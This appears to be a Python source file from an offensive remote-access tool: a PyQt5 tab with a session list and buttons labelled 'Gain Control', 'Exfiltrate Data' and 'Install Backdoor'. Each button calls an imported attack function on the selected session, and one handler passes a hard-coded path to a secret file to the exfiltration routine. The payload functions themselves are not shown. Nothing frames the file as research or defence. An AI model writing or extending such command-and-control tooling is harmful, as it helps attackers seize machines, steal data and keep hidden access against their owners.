from PyQt5.QtWidgets import QWidget, QVBoxLayout, QPushButton, QListWidget
from core.system_control import gain_control, exfiltrate_data
from core.backdoor import install_backdoor

class ControlTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        self.session_list = QListWidget()
        layout.addWidget(self.session_list)

        control_button = QPushButton("Gain Control")
        control_button.clicked.connect(self.gain_control)
        layout.addWidget(control_button)

        exfiltrate_button = QPushButton("Exfiltrate Data")
        exfiltrate_button.clicked.connect(self.exfiltrate_data)
        layout.addWidget(exfiltrate_button)

        backdoor_button = QPushButton("Install Backdoor")
        backdoor_button.clicked.connect(self.install_backdoor)
        layout.addWidget(backdoor_button)

        self.setLayout(layout)

    def gain_control(self):
        selected_items = self.session_list.selectedItems()
        if selected_items:
            session_id = selected_items[0].text()
            session = gain_control(session_id)
            self.session_list.addItem(f"Session {session_id} controlled")

    def exfiltrate_data(self):
        selected_items = self.session_list.selectedItems()
        if selected_items:
            session_id = selected_items[0].text()
            file_path = "path/to/secret/file.txt"
            exfiltrate_data(session_id, file_path)

    def install_backdoor(self):
        selected_items = self.session_list.selectedItems()
        if selected_items:
            session_id = selected_items[0].text()
            install_backdoor(session_id)